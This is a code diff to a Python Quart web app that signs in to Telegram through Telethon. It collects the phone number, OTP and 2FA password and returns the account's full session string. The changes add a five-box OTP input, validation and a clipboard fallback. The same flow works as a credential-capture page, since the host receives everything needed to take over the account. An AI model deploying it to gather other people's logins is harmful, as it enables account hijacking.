@@ -152,6 +152,23 @@ button:disabled{
     color:#2481cc;
     font-size:14px;
 }
+
+.otp-container{
+    display:flex;
+    justify-content:center;
+    gap:10px;
+    margin-top:15px;
+}
+
+.otp-box{
+    width:55px !important;
+    height:55px;
+    text-align:center;
+    font-size:22px;
+    font-weight:700;
+    border-radius:12px;
+    padding:0 !important;
+}
 </style>
 </head>
 
@@ -178,16 +195,20 @@ button:disabled{
     </div>
 
     <div id="step-otp" class="hidden">
-        <input
-            type="text"
-            id="otp"
-            placeholder="Enter OTP"
-        >
 
-        <button id="otpBtn" onclick="sendOtp()">
-            Verify OTP
-        </button>
+    <div class="otp-container">
+        <input type="text" class="otp-box" maxlength="1">
+        <input type="text" class="otp-box" maxlength="1">
+        <input type="text" class="otp-box" maxlength="1">
+        <input type="text" class="otp-box" maxlength="1">
+        <input type="text" class="otp-box" maxlength="1">
     </div>
+
+    <button id="otpBtn" onclick="sendOtp()">
+        Verify OTP
+    </button>
+
+</div>
 
     <div id="step-2fa" class="hidden">
         <input
@@ -312,13 +333,23 @@ async function sendPhone(){
     setLoading(false);
 }
 
-async function sendOtp(){
+async function sendOtp() {
+
+    const otpInputs =
+        document.querySelectorAll(".otp-box");
 
     const otp =
-        document.getElementById("otp")
-        .value.trim();
+        Array.from(otpInputs)
+        .map(input => input.value.trim())
+        .join("");
 
-    if(!otp) return;
+    if (otp.length !== 5) {
+        document.getElementById(
+            "error-msg"
+        ).innerText =
+            "Enter complete OTP.";
+        return;
+    }
 
     document.getElementById(
         "error-msg"
@@ -326,26 +357,26 @@ async function sendOtp(){
 
     setLoading(true);
 
-    try{
+    try {
 
         const res =
             await safeAPI(
                 "/submit_otp",
                 {
-                    phone:currentPhone,
-                    code:otp
+                    phone: currentPhone,
+                    code: otp
                 }
             );
 
-        if(res.status==="ok"){
+        if (res.status === "ok") {
 
             showSuccess(
                 res.session
             );
 
-        }else if(
-            res.status==="2fa_needed"
-        ){
+        } else if (
+            res.status === "2fa_needed"
+        ) {
 
             document
                 .getElementById("step-otp")
@@ -360,7 +391,7 @@ async function sendOtp(){
                 .innerText =
                 "2FA password required.";
 
-        }else{
+        } else {
 
             document
                 .getElementById("error-msg")
@@ -368,7 +399,7 @@ async function sendOtp(){
                 res.message;
         }
 
-    }catch(err){
+    } catch (err) {
 
         document
             .getElementById("error-msg")
@@ -460,14 +491,138 @@ async function copySession(){
     const text =
         document
         .getElementById("token-box")
-        .innerText;
+        .innerText
+        .trim();
 
-    await navigator
-        .clipboard
-        .writeText(text);
+    try{
 
-    alert("Session copied!");
+        await navigator
+            .clipboard
+            .writeText(text);
+
+        alert("Session copied!");
+
+    }catch(err){
+
+        const temp =
+            document.createElement(
+                "textarea"
+            );
+
+        temp.value = text;
+
+        document.body
+            .appendChild(temp);
+
+        temp.select();
+
+        document.execCommand(
+            "copy"
+        );
+
+        document.body
+            .removeChild(temp);
+
+        alert("Session copied!");
+    }
 }
+
+document.addEventListener(
+    "DOMContentLoaded",
+    ()=>{
+
+    const inputs =
+        document.querySelectorAll(
+            ".otp-box"
+        );
+
+    inputs.forEach(
+        (input,index)=>{
+
+        input.addEventListener(
+            "input",
+            (e)=>{
+
+            e.target.value =
+                e.target.value
+                .replace(
+                    /\D/g,
+                    ''
+                );
+
+            if(
+                e.target.value &&
+                index <
+                inputs.length - 1
+            ){
+                inputs[
+                    index + 1
+                ].focus();
+            }
+        });
+
+        input.addEventListener(
+            "keydown",
+            (e)=>{
+
+            if(
+                e.key ===
+                "Backspace" &&
+                !input.value &&
+                index > 0
+            ){
+                inputs[
+                    index - 1
+                ].focus();
+            }
+        });
+
+        input.addEventListener(
+            "paste",
+            (e)=>{
+
+            e.preventDefault();
+
+            const pasted =
+                (
+                    e.clipboardData
+                    .getData("text")
+                    || ""
+                )
+                .replace(
+                    /\D/g,
+                    ''
+                )
+                .slice(0,5);
+
+            pasted
+            .split("")
+            .forEach(
+                (char,i)=>{
+
+                if(inputs[i]){
+                    inputs[i]
+                    .value =
+                    char;
+                }
+            });
+
+            const lastFilled =
+                Math.min(
+                    pasted.length,
+                    inputs.length
+                ) - 1;
+
+            if(
+                lastFilled >= 0
+            ){
+                inputs[
+                    lastFilled
+                ].focus();
+            }
+        });
+    });
+});
 
 </script>
 
@@ -477,73 +632,214 @@ async function copySession(){
 
 @app.route('/')
 async def index():
-    # âœ… FIXED: Added await here
-    return await render_template_string(HTML_TEMPLATE)
+    return await render_template_string(
+        HTML_TEMPLATE
+    )
+
 
 @app.route('/submit_phone', methods=['POST'])
 async def submit_phone():
-    data = await request.get_json()
-    phone = data.get("phone", "").strip().replace(" ", "")
-    
+
+    data = await request.get_json() or {}
+
+    phone = str(
+        data.get("phone", "")
+    ).strip().replace(" ", "")
+
     if not phone:
-        return jsonify({"status": "error", "message": "Phone number missing."})
-        
+        return jsonify({
+            "status": "error",
+            "message":
+            "Phone number missing."
+        })
+
+    client = None
+
     try:
-        client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="Telegram Web", system_version="Windows Web", app_version="1.0.0")
+
+        client = TelegramClient(
+            StringSession(),
+            API_ID,
+            API_HASH,
+            device_model="Telegram Web",
+            system_version="Windows Web",
+            app_version="1.0.0"
+        )
+
         await client.connect()
-        
-        send_code = await client.send_code_request(phone)
+
+        send_code = await client.send_code_request(
+            phone
+        )
+
         user_sessions[phone] = {
             "client": client,
-            "phone_code_hash": send_code.phone_code_hash
+            "phone_code_hash":
+            send_code.phone_code_hash
         }
-        return jsonify({"status": "ok"})
+
+        return jsonify({
+            "status": "ok"
+        })
+
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
+
+        if client:
+            await client.disconnect()
+
+        return jsonify({
+            "status": "error",
+            "message": str(e)
+        })
+
 
 @app.route('/submit_otp', methods=['POST'])
 async def submit_otp():
-    data = await request.get_json()
-    phone = data.get("phone")
-    code = data.get("code", "").strip()
-    
-    if phone not in user_sessions:
-        return jsonify({"status": "error", "message": "Session context missing. Reload page."})
-        
-    session_data = user_sessions[phone]
-    client = session_data["client"]
-    phone_code_hash = session_data["phone_code_hash"]
-    
-    try:
-        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-        session_str = client.session.save()
-        await client.disconnect()
-        user_sessions.pop(phone, None)
-        return jsonify({"status": "ok", "session": session_str})
-    except SessionPasswordNeededError:
-        return jsonify({"status": "2fa_needed"})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
 
-@app.route('/submit_password', methods=['POST'])
-async def submit_password():
-    data = await request.get_json()
-    phone = data.get("phone")
-    password = data.get("password", "").strip()
-    
+    data = await request.get_json() or {}
+
+    phone = str(
+        data.get("phone", "")
+    ).strip()
+
+    code = str(
+        data.get("code", "")
+    ).strip()
+
     if phone not in user_sessions:
-        return jsonify({"status": "error", "message": "Session context missing. Reload page."})
-        
-    client = user_sessions[phone]["client"]
+        return jsonify({
+            "status": "error",
+            "message":
+            "Session context missing. Reload page."
+        })
+
+    session_data = user_sessions[
+        phone
+    ]
+
+    client = session_data[
+        "client"
+    ]
+
+    phone_code_hash = session_data[
+        "phone_code_hash"
+    ]
+
     try:
-        await client.sign_in(password=password)
-        session_str = client.session.save()
+
+        await client.sign_in(
+            phone=phone,
+            code=code,
+            phone_code_hash=
+            phone_code_hash
+        )
+
+        session_str =
+            client.session.save()
+
         await client.disconnect()
-        user_sessions.pop(phone, None)
-        return jsonify({"status": "ok", "session": session_str})
+
+        user_sessions.pop(
+            phone,
+            None
+        )
+
+        return jsonify({
+            "status": "ok",
+            "session":
+            session_str
+        })
+
+    except SessionPasswordNeededError:
+
+        return jsonify({
+            "status":
+            "2fa_needed"
+        })
+
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
+
+        return jsonify({
+            "status":
+            "error",
+            "message":
+            str(e)
+        })
+
+
+@app.route(
+    '/submit_password',
+    methods=['POST']
+)
+async def submit_password():
+
+    data = await request.get_json() or {}
+
+    phone = str(
+        data.get("phone", "")
+    ).strip()
+
+    password = str(
+        data.get(
+            "password", ""
+        )
+    ).strip()
+
+    if phone not in user_sessions:
+
+        return jsonify({
+            "status":
+            "error",
+            "message":
+            "Session context missing. Reload page."
+        })
+
+    client = user_sessions[
+        phone
+    ]["client"]
+
+    try:
+
+        await client.sign_in(
+            password=password
+        )
+
+        session_str =
+            client.session.save()
+
+        await client.disconnect()
+
+        user_sessions.pop(
+            phone,
+            None
+        )
+
+        return jsonify({
+            "status": "ok",
+            "session":
+            session_str
+        })
+
+    except Exception as e:
+
+        return jsonify({
+            "status":
+            "error",
+            "message":
+            str(e)
+        })
+
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+
+    port = int(
+        os.environ.get(
+            "PORT",
+            5000
+        )
+    )
+
+    app.run(
+        host='0.0.0.0',
+        port=port
+    )
